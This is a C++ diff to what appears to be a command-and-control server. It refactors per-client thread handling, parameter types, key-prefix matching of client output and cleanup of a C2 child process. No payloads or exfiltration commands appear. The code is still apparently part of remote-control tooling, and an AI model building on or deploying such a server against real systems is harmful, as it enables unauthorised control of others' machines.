@@ -12,7 +12,7 @@ Server::Server() {
     max_connections_ = DEFAULT_MAX_CONNECTIONS;
     user_verbosity_ = DEFAULT_VERBOSITY;
 }
-Server::Server(const std::string& __ip, const uint32_t __port, const uint8_t __max_connections) {
+Server::Server(const std::string& __ip, const int __port, const int __max_connections) {
     port_ = __port;
     ip_ = __ip;
     max_connections_ = __max_connections;
@@ -84,6 +84,10 @@ int Server::init() {
         return -1;
     }
 
+    /*for (int i=0; i<max_connections_; i++) {
+        spy_tunnels_[i] = {};
+    }*/
+    client_threads_.resize(max_connections_);
     clients_.resize(max_connections_);
     for (int i=0;i<max_connections_;i++) {
         clients_[i] = nullptr;
@@ -195,7 +199,6 @@ int Server::accept_client() {
                             client_index = i;
                             clients_[client_index]->init_client(client_addr, client_socket, client_index);
                             client_count_++;
-                            //event_log << GREEN << "[Server::accept_client] New connection from: " << clients_[i]->ip() << RESET;
                             event_log << GREEN << "[Server::accept_client] New connection from: " << clients_[client_index]->ip() << RESET;
                             break;
                         }
@@ -208,7 +211,11 @@ int Server::accept_client() {
                 }
                 // Start a new handle_client thread for the client
                 try {
-                    client_threads_.emplace_back(&Server::handle_client, this, clients_[client_index]);
+                    if (client_threads_[client_index].joinable()) {
+                        client_threads_[client_index].join();
+                    }
+                    //client_threads_.emplace_back(&Server::handle_client, this, clients_[client_index]);
+                    client_threads_[client_index] = std::thread(&Server::handle_client, this, clients_[client_index]);
                 } catch (const std::system_error& e) {
                     event_log << RED << "[Server::accept_client] Error creating thread for client" << RESET;
                     {
@@ -226,25 +233,23 @@ int Server::accept_client() {
 }
 
 void Server::handle_client(ClientHandler* client) {
-    // Receive data from the client
     char buffer[MAX_BUFFER_SIZE];
     int recv_rc;
     int send_rc;
-    //EventLog event_log(&log_mutex_, &log_cv_, &log_queue_, &user_verbosity_);
+    
     EventLog event_log(log_context_);
     while (!shutdown_flag_) {
         memset(buffer, 0, sizeof(buffer));
         recv_rc = recv_buf(client->socket(), buffer, sizeof(buffer), shutdown_flag_);
         if (recv_rc < 0) {
             event_log << RED << "[Server::handle_client] Client " << client->index() << " failed: " << recv_rc << RESET;  
-            break; // @todo find a better way to handle recv error
+            break;
         } else if (recv_rc == PEER_DISCONNECTED_ERROR) {
             event_log << RED << "[Server::handle_client] Client: " << client->index() << " disconnected" << RESET;
-            break; // @todo find a better way to handle client disconnection
+            break;
         } else {
-            // Test
-            if (strncmp(buffer, OUT_KEY, 6) == 0) {
-                event_log << CYAN << buffer + 6 << RESET_C2_FIFO;
+            if (strncmp(buffer, OUT_KEY, strlen(OUT_KEY)) == 0) {
+                event_log << CYAN << buffer + OUT_KEY_SIZE << RESET_C2_FIFO;
             } else {
                 event_log << LOG_MINOR_EVENTS <<  GREEN << "[Server::handle_client] Data from client " << client->index() << ": " << buffer << RESET;                
             }
@@ -300,9 +305,7 @@ void Server::handle_c2() {
         _exit(EXIT_FAILURE);
     }
 
-    // Parent process 
-    c2_child_pid = pid;
-
+    // Parent process
     EventLog event_log(log_context_);
     CommandHandler command_handler(&clients_, &event_log, &shutdown_flag_, &user_verbosity_);
     ScopedEpollFD epoll_fd;
@@ -407,9 +410,9 @@ void Server::handle_c2() {
         }
     }
 c2_cleanup:
-    if (c2_child_pid > 0) {
-        kill(c2_child_pid, SIGTERM);
-        waitpid(c2_child_pid, nullptr, 0);
+    if (pid > 0) {
+        kill(pid, SIGTERM);
+        waitpid(pid, nullptr, 0);
     }
     if (shutdown_flag_) {
         event_log << MAGENTA << "[Server::handle_c2] SHUTTING DOWN" << RESET;
